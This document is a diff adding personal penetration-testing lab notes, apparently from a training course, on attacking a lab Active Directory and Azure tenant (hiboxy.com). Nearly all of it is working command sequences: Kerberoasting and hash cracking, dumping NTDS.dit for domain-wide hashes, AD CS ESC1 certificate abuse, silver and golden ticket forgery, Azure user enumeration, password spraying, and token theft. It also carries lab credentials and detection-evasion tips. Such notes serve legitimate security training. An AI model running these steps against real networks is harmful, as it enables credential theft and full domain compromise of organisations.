@@ -1,0 +1,472 @@
+{{{ Section: Kerberoast - PRIVESC ================================================================
+
+// enum & request ticket - GetUserSPNs.py
+- requires access as any user 
+
+GetUserSPNs.py hiboxy.com/bgreen:Password1 -request -dc-ip 10.130.10.4 | tee /tmp/spns.output
+-request = tell too to request tickets after identifying them 
+-dc-ip = DC ip...
+
+# 2 svc accounts identified: SVC_SQLService & Service2
+- also shows MemberOf: in this case: Domain Admins 
+
+$krb5tgs$23$ = service ticket encrypted with RC4 (the 23)
+
+
+// grep key to keyfile
+grep krb5tgs /tmp/spns.output > /tmp/tickets
+
+// crack a ticket 
+hashcat -m 13100 -a 6 /tmp/tickets /opt/passwords/english-dictionary-capitalized.txt ?d
+
+
+// crack the domain admin ticket 
+hashcat -m 13100 -a 7 /tmp/tickets ?s /opt/passwords/english-dictionary-capitalized.txt
+-a 7 
+?s prepend special char 
+-- changed order of the mask and dictionary 
+
+\\ use stolen cred
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 whoami
+
+// confirm DC
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 hostname
+
+// get list of users 
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 net user
+
+// see ur groups
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 net user SVC_SQLService2
+
+
+===================================================================}}}
+
+{{{ Section: Domain Dominance ================================================================
+
+    create a shadow copy of the NTDS.dit file on DC01.sec560.local (10.130.10.4)
+    extract the copy from DC01 back to our own machine
+    extract the password hashes of the entire active directory
+
+// estab shell on DC01 --- using creds from prior Kerberoast lab
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4
+
+// look at shadow copies 
+vssadmin.exe list shadows
+- if none exist, create one. otherwise can use an existing one (or still create one)
+- note ID number of 'HarddiskVolumeShadowCopyX'
+        Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 
+        Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+
+// create shadow copy IF NONE ABOVE 
+vssadmin create shadow /for=c:
+- note index of newly created copy 
+
+// copy NTDS.dit and System Hive (system/sec = private key)
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit
+
+// IOT extrat ntds.dit hashes - will need the encryption key in SYSTEM hive
+// 1. backup
+reg save hklm\system c:\extract\system /y
+- will take a minute 
+- /y = reg overwrites existing file if exists
+
+// copy NTDS.dit to machine 
+smbclient.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4
+use c$
+cd extract
+get ntds.dit
+get system
+exit
+ \\ 70M download 
+
+// extract hashes 
+secretsdump.py -ntds ~/labs/ntds.dit -system ~/labs/system -outputfile /tmp/hashes.txt LOCAL
+
+    -ntds ntds.dit_filename
+    -system system_filename
+    -outputfile output_filename
+    LOCAL: Tells secretsdump.py that the attack is local and we are not remotely accessing credentials
+
+- less /tmp/hashes.txt.ntds
+- note intersting hash
+DC01$:1009:aad3b435b51404eeaad3b435b51404ee:1c161e31b3f38aceac204b8fa6d2e8a2:::
+
+
+// follow up options
+
+    Crack the password hashes
+    Pass-the-hash
+    Use the krbtgt hash for golden ticket attacks
+
+
+===================================================================}}}
+
+{{{ Section: Attacking AD Cert Cervices (AD CS) with ESC - PRIVESC ================================================================
+
+// need to configure Win system to use DNS server for lookups ONLY for tgt machine (hiboxy.com)
+- having VPN take control of DNS would: alert tgt org what we're querying or and generate extra logs (if DNS filtering/alerting)
+
+Add-DnsClientNrptRule -Namespace "hiboxy.com" -NameServers 10.130.10.4
+        \\ linux reference: sudo systemd-resolve -i tun0 --set-dns=10.130.10.4 --set-domain=hiboxy.com
+
+// attack CA01 @ 10.130.10.7 
+- will need to run cli aas hiboxy\bgreen since comptuter is not join to domain 
+runas /user:hiboxy.com\bgreen /netonly cmd.exe
+
+// initial query 
+- list all CAs and templates 
+       - since not domain joined, must use /domain:hiboxy.com. wudnt if was on compromised domain host
+\Tools\Certify.exe cas /domain:hiboxy.com
+
+# OUTPUT
+[*] Root CAs
+    Cert SubjectName              : CN=hiboxy-CA01-CA, DC=hiboxy, DC=com
+        - learned name 
+[*] Enterprise/Enrollment CAs:
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+- allows any user 2 enroll certs: not safe, relatively common 
+
+// search for VULNS (find vulnerable certificate templates)
+\Tools\Certify.exe find /vulnerable /domain:hiboxy.com
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+                                      <UNKNOWN>                     S-1-5-21-804912607-507672161-4202880709-513
+
+--- // The tool identified that the UserAuthenticationCertificate template includes ENROLLEE_SUPPLIES_SUBJECT in the msPKI-Certificate-Name-Flag attribute.
+--- // This configuration allows any authenticated user in the domain to request certificates for any user in the domain.
+
+\\ this would work if NOT using runas 
+Certify.exe request /ca:hiboxy.com\CA01 /onbehalfof:hiboxy.com\bgreen /template:UserAuthenticationCertificate /altname:Administrator /domain:hiboxy.com
+
+// CERTIPY
+
+# INSTALL 
+sudo pip3 install certipy-ad
+sudo sed -i 's/, required=True//' /usr/local/lib/python3.6/dist-packages/certipy/entry.py
+
+// identify vuln templates 
+certipy find -u bgreen@hiboxy.com -password Password1 -dc-ip 10.130.10.4
+
+// review contents 
+cat *_Certipy.json
+
+// regrep for known vuln template from above
+cat *_Certipy.txt | grep -A 18 UserAuthenticationCertificate
+
+Client Authentication               : True
+Enrollee Supplies Subject           : True
+Requires Manager Approval           : False
+Authorized Signatures Required      : 0
+
+The above line allows users to authenticate using certificates from this template.
+
+The above line allows the enrollee (us, the attacker) to specify the subject name.
+
+The above line tells us that no additional approval is required to use this template.
+
+
+// view 40 lines after the template name 
+cat *_Certipy.txt | grep -A 40 UserAuthenticationCertificate
+                                          HIBOXY.COM\Domain Users 
+                             [!] Vulnerabilities
+      ESC1                              : 'HIBOXY.COM\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+
+        // Domain Users has Enrollment Permissions, tool detected vuln tempalte                       
+
+// Request Cert with Certipy
+grep "CA Name" *_Certipy.txt // search prev cmd for CA server name 
+
+
+// REQUEST FOR CERT 
+sudo certipy req -username bgreen@hiboxy.com -password Password1 -ca hiboxy-CA01-CA -template UserAuthenticationCertificate -upn administrator@hiboxy.com -target ca01.hiboxy.com
+
+
+    req - command to request the certificate
+    -username bgreen@hiboxy.com - the user to authenticate as
+    -password Password1 - password of the user above
+    -ca hiboxy-CA01-CA - the name of the CA
+    -template UserAuthenticationCertificate The name of the vulnerable template
+    -upn administrator@hiboxy.com - the user we are going to impersonate
+    -target ca01.hiboxy.com - the FQDN of the CA server
+
+// recover NT hash using recovered cert; can auth to any svc as Admin account! use cert to get NT hash from admin account 
+sudo certipy auth -pfx administrator.pfx
+--- NOW CAN CRACK or PTH
+
+received a TGT (Ticket Granting Ticket) for the Administrator account.can use this TGT to authenticate via Kerberos to a wide range of services
+
+===================================================================}}}
+
+{{{ Section: Silver Ticket - PERSIST ================================================================
+
+    use Rubeus to access the file server (file01) as bgreen.
+    use the hash of file01 to create a silver ticket for the CIFS service on file01.
+    generate a ticket with bogus user data that allows us to access file01.
+
+// for external machine access through VPN, config DNS query
+Add-DnsClientNrptRule -Namespace "hiboxy.com" -NameServers 10.130.10.4
+        \\ linux - dont run: sudo systemd-resolve -i tun0 --set-dns=10.130.10.4 --set-domain=hiboxy.com
+
+// test compromsied user's access
+runas /user:hiboxy.com\bgreen /netonly cmd.exe
+        // view share --- if ACCESS DENIED/not found - mistyped pass
+dir \\file01.hiboxy.com\c$
+        -- user doesn't have access...
+
+>>> give silver ticket!
+
+// Getting info to build ticket 
+- can run as any domain justed regular user 
+
+NEED:
+NT Hash for the target service
+Domain SID
+
+// get domain sid 
+lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.4 520
+[*] Domain SID is: S-1-5-21-2575093164-872229104-2221911553
+
+// target file01 server 
+secretsdump.py hiboxy.com/SVC_SQLService2:^^Cakemaker@10.130.10.4 -just-dc-user file01$
+        -- ^^ 2 to escape windows for passwd
+FILE01$:1641:aad3b435b51404eeaad3b435b51404ee:7c28c4fbe4b2a28f4998abf6ad97aff4::: 
+^ LM:NT 
+- LM only good for archaic sytems
+
+// create ticket w/Rubeus 
+C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:7c28c4fbe4b2a28f4998abf6ad97aff4 /sid:S-1-5-21-2575093164-872229104-2221911553 /ptt /user:bgreen
+
+silver: The Silver Ticket feature in Rubeus
+/user:bgreen: The user we are going to present in the ticket
+/service:cifs/file01.hiboxy.com: We are going to be targeting the cifs (Common Internet File System is a dialect of SMB, which is used with fileshares)
+/rc4:NT_HASH_FROM_secretsdump.py: We are going to generate the ticket using RC4 and the NT hash output from secretsdump.py
+/ptt: Load the ticket into memory so we can use it
+
+
+// view ticket 
+klist
+
+dir \\file01.hiboxy.com\c$
+
+
+// MAKE A SECOND TICKET // bogus user 
+- clear ticket 
+klist purge
+
+// make /user:pwnd  /id 777
+C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:7c28c4fbe4b2a28f4998abf6ad97aff4 /sid:S-1-5-21-2575093164-872229104-2221911553 /ptt /user:pwned /id:777
+
+klist 
+dir \\file01.hiboxy.com\c$
+
+// now - make another ticket for different serviceclass (service) - iot query remote systems Event log
+// replace service:cifs with service:host
+C:\Tools\Rubeus.exe silver /service:host/file01.hiboxy.com /rc4:7c28c4fbe4b2a28f4998abf6ad97aff4 /sid:S-1-5-21-2575093164-872229104-2221911553 /ptt /user:pwned /id:777
+klist 
+
+// query eventlogs 
+wevtutil /r:file01.hiboxy.com qe Security "/q:*[System/EventID=4624] and *[EventData/Data[@Name='TargetUserName']='pwned']" /f:text /c:1
+
+
+--- uber powerful persistence: don't need user/password - can pretend to be ANY user / fake account 
+--- tho computer hashes rotate monthly... malicious users can disable - set key to 1
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange
+
+
+// created a silver ticket for the CIFS service on FILE01, using the FILE01$ machine account hash. The silver ticket only gives access to the target service that is specified and for which we have compromised the hash or password. In this case, the CIFS service could be used to obtain sneaky persistence.
+
+===================================================================}}}
+
+{{{ Section: Golden Ticket - PERSIST ================================================================
+
+
+   extract the Kerberos keys for the krbtgt account
+   create a golden ticket with the obtained key
+   use the golden ticket to access the domain
+
+
+// extract krbtgt account secrets - already have domain admin
+secretsdump.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 -just-dc-user krbtgt
+
+    Domain: hiboxy.com
+    Username: SVC_SQLService2
+    Password: ^Cakemaker
+        -just-dc-user option to extract the password hash for the krbtgt account.
+        :password - save time 
+
+\\ hash 
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2bd1524aa57c3870d457e02353de3aca:::
+
+// get domain name 
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 ipconfig /all
+   Connection-specific DNS Suffix  . : hiboxy.com
+
+// get domain SID
+lookupsid.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 520
+[*] Domain SID is: S-1-5-21-2575093164-872229104-2221911553
+
+// create gold ticket 
+
+sudo ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-2575093164-872229104-2221911553 -nthash 2bd1524aa57c3870d457e02353de3aca Administrator
+
+// USE TICKET - Administrator
+        \\ in real envir. would load ticket into memory using meterp // Mimikatz for WIN
+        kerberos::ptt C:\Tools\Mimikatz\x64\ticket.kirbi 
+
+\\ for nix
+export KRB5CCNAME=Administrator.ccache
+
+// can now use any Impacket tool w/o arguments 
+wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com hostname
+
+// MAKE ANOTHER TICKET - forged acc
+- forge user / ID instead of using Administrator 
+
+sudo ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-2575093164-872229104-2221911553 -nthash 2bd1524aa57c3870d457e02353de3aca pwned
+
+// use it 
+export KRB5CCNAME=pwned.ccache
+wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com whoami
+   [-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)
+
+doesn't work bc: Windows 2019 DCs with patch validate the username to ensure it maches the numeric ID
+- doesn't work here but may work elsewhere
+
+
+===================================================================}}}
+
+{{{ Section: Azure Recon and Passwd Spray  ================================================================
+- if locked out, bc same IP from lab (smart lockout)
+
+
+    AADInternals Modules to perform Domain Reconnassaince
+    AADInternals Module for single username harvesting
+    AADInternals Module to harvest a large number of users
+    Spray365.py for password attacks, using a limited password spraying attack
+
+
+// load AADInternals 
+Import-Module AADInternals
+
+// Recon domain 
+Invoke-AADIntReconAsOutsider -DomainName hiboxy.com | Format-Table
+- original Tenant name - can reveal patterns 
+- DesktopSSO is not enbled -> meaning AZUREADSSOACC not On Premises domain; not atk vector 
+
+Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"
+
+// target users for enumeration 
+Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"
+
+// Username harvesting 'attack'
+Get-Content C:\CourseFiles\users.txt
+Get-Content C:\CourseFiles\users.txt | Invoke-AADIntUserEnumerationAsOutsider
+
+// build list of existing users 
+Get-Content C:\CourseFiles\users.txt | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName
+
+// Prep attack on Linux 
+
+cat << EOF > /tmp/users.txt
+abates
+aparker
+mlara
+slopez
+EOF
+
+cat /tmp/users.txt
+
+// create passwords.txt file (from passwds cracked earler lab)
+cat << EOF > /tmp/passwords.txt
+Oozle11
+Password123
+Packardbell350
+Metallica6
+Tibbetts3
+Patrique2238
+EOF
+
+cat /tmp/passwords.txt
+
+
+// Password Spray 
+
+Specify 5 items: 
+    The users.txt file with a list of usernames, not email addresses
+    The domain we wish to attack, in this case, hiboxy.com
+    A list of passwords to spray. We will create a file called passwords.txt
+    The delay interval. To prevent lockout issues in the lab, we have configured Smart Lockout with very permissive settings. As such, we can adjust our delay to something short. In the real world, you would likely need to go much slower.
+    We will hard set the Endpoint ID to the Cloud Web App Proxy
+
+python3.7 /opt/Spray365/spray365.py generate -d hiboxy.com -u /tmp/users.txt -pf /tmp/passwords.txt --delay 2 -eID https://proxy.cloudwebappproxy.net/registerapp -cID "00b41c95-dab0-4487-9791-b9d2c32c80f2" -ep hiboxy.s365
+
+{{{ args ================================================================
+
+-d: The domain to check
+-u: The file with the list of usernames to check in the form of a User Principal Name (UPN) or email address
+-pf: A password file for the spraying attempt
+--delay: How many seconds between each request
+-eID: When this switch is specified, instead of attempting to use multiple Sign-in Endpoints that Microsoft has available, we will only use the one specified. It hard sets it to the endpoint of the Office365 Application, which we know works for this tenant. Not every application is available for every tenant. Using a static value for our lab reduces our false-positive rate for students.
+
+-cID: Client Identifier, this one is tricky. Recall that in our Azure AD Introduction, we discussed how every Client that attempts to use Azure AD to log in has an identifier. For example, Salesforce would have its application registered in Azure AD, and that application has a Client Identifier. Even though the Salesforce company registered it, the Identifier is global. Microsoft has done this for every application it has; they then hardcode these Identifiers in the application. We set ours to "Office 365 Management (mobile app)." The combination we choose may reduce the risk of hitting an anomaly detection alarm. Is there a list of Microsoft Client Identifiers maintained somewhere? There are several resources that we have found.
+
+
+
+===================================================================}}}
+
+// reduced attack 
+python3.7 /opt/Spray365/spray365.py spray -ep hiboxy.s365
+
+// display output 
+cat spray365_results_*.json | jq -r '.[] | select(._auth_complete_success == true) | .credential | "Username: \(.username) Password: \(.password)"'
+
+===================================================================}}}
+
+{{{ Section: Running Commands ================================================================
+
+
+    Log in to Azure using the compromised credentials
+    Use the credentials to scan for common Azure misconfigurations
+    Remotely execute commands on a system without having access to the network portion of Azure
+
+
+// log into az
+az
+
+// login via CLI
+az login -u aparker@hiboxy.com -p Oozle11
+
+// stores stuff here:
+    ~/.azure: Linux / OSX / Unix type shells. I.E. /home/sec560/.azure
+    %HOMEPATH%\.azure: Windows Location. I.E. C:\Users\sec560\.azure
+
+- hometenantID and tenantId are the same == this is aparker's Home Tenant 
+
+// view access and refresh token (not encrypteed on linux, is on windows az tool)
+cat ~/.azure/msal_token_cache.json
+az account get-access-token
+
+\\ fix docker issue: ip -brief addr show dev docker0 | grep 172 || sudo service docker restart
+
+// laun ScoutSuite docker 
+docker run -v /tmp/scoutsuite:/tmp/scoutsuite -it rossja/ncc-scoutsuite
+
+// randomly gen user
+shuf -n1 -e aparker abates mlara slopez
+
+// log in
+scout azure --user-account --report-dir /tmp/scoutsuite
+
+
+
+
+
+===================================================================}}}
+
+{{{ Section: Gain access, move laterally ================================================================
+
+
+
+===================================================================}}}
+
